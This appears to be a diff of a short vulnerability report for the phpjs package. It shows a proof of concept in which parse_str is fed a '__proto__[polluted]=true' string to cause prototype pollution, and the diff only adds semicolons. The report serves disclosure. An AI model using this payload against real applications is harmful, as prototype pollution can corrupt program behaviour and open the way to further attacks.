@@ -3,7 +3,7 @@
 This package is vulnearble to ```prototype pollution``` via ```parse_str```. 
 # Proof Of Concept
 ```
-const phpjs = require('phpjs')
+const phpjs = require('phpjs');
 phpjs.parse_str("__proto__[polluted]=true",{}); 
-console.log(polluted)
+console.log(polluted);
 ```
